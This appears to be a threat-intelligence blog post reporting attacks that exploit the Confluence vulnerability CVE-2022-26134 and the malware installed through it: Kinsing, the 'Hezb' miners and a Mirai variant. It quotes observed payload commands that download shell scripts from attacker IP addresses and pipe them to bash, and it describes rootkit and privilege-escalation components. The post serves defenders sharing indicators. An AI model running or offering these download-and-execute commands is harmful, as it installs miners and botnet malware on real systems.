Details regarding the recent Confluence OGNL (CVE-2022-26134) exploit were released to the public on June 3rd 2022.
Shortly following this, Lacework Labs began seeing multiple attacks in the wild from both uncategorized and named
threats. While this was expected, there appears to be more widespread exploitation of CVE-2022-26134 compared to
previous Confluence vulnerabilities.
As of this writing we have observed active exploitation by known Cloud threat malware families such as Kinsing, “Hezb”,
and the Dark.IoT botnet. This blog provides a current inventory of top threats seen exploiting this latest Confluence
vulnerability. Additional IOCs associated with this vulnerability are included in our Github repo.

Kinsing
Kinsing is often one of the first threats to add a new exploit to their toolbox, and CVE-2022-26134 was no different. One
interesting development was the use of a new malware host – 195.2.79.26 for the Kinsing installer. This is noteworthy
because Kinsing often leverages legacy infrastructure in their attacks. Observed payload commands for CVE-202226134:
/bin/sh -c wget -q -O - http://185.191.32.198/cf.sh | bash &amp;gt; /dev/null 2&amp;gt;&amp;amp;1
bash -c (curl -s 195.2.79.26/cf.sh||wget -q -O- 195.2.79.26/cf.sh)|bash

The initial payload cf.sh is currently not available on VirusTotal. However, it’s a typical installer which downloads and runs
the Kinsing H2miner malware as well as a userland level rootkit via libsystem.so. This shared object in turn would be
leveraged in LD_PRELOAD attacks (T1574.006).

Hezb

2/6

Another threat, dubbed “Hezb” based on command line artifact data, was observed around Kinsing. This malware is
relatively new and was recently reported in late May exploiting WSO2 RCE (CVE-2022-29464) in the wild. Several
malware components were observed, the first of which was an XMRig miner installed as “Hezb”. Additional modules
included a polkit exploit for privilege escalation as well as a zero-detection ELF payload named “kik”. The following table
lists observed artifacts and descriptions.

Prior to the Hezb miner, another XMRig variant was observed and is believed to belong to the same group via shared
infrastructure. This miner is a variant of xmrigCC which is a modified version of XMRig with C2 capabilities. Payload
command:
curl http://134.213.29.14:32953/2/c2/java.tar.gz --output /var/tmp/java.tar.gz

Privilege Escalation via pwnkit (binary name: ko)
CVE-2021-4034 released earlier this year resulted in privilege escalation via a bug in the SETUID application “polkit”. The
aptly named “pwnkit” exploit was observed being spread within droppers taking advantage of the most recent confluence
vulnerability.The image below shows the Ghidra decompilation for this utility, aligning to many of the public proof-ofconcept exploits that exist on Github for this vulnerability.

Post Execution Payload – Kik
Kik is a statically linked, non-stripped 64-bit Golang ELF binary. This binary attempts to match for specific values while
excluding others and pipes the resulting values to “kill -9”.This is executed in a while true loop printing out “command
executed successfully” to stdout.

Dark.IoT
A unique Mirai variant was also installed as “x” and was downloaded from host 136.144.41.171. Observed commands:
/bin/sh -c wget -q -O - 136.144.41.171/atl | sh &amp;gt; /dev/null 2&amp;gt;&amp;amp;1
wget 136.144.41.171/x

This malware is characterized by alternative DNS connections and connects to several *.lib domains using custom DNS
servers. The following observed DNS servers, hostnames and resolutions were observed:

This set of Mirai activity was reported in September 2021 targeting Realtek devices as part of the Dark.IoT botnet.
Dark.IoT is a prolific botnet that has expanded its activity beyond targeting of IoT devices, for example with an Oracle
weblogic exploit and targeting of Azure Open Management infrastructure.
Exploits involving Confluence are always popular among various threats including those targeting cloud. While Lacework
Labs observed a lot of activity relative to other exploits, there is still low exposure compared to the more impactful “coffee
break” vulnerabilities such as those involving log4j or apache. For a complete list of IoCs observed in CVE-2022-26134
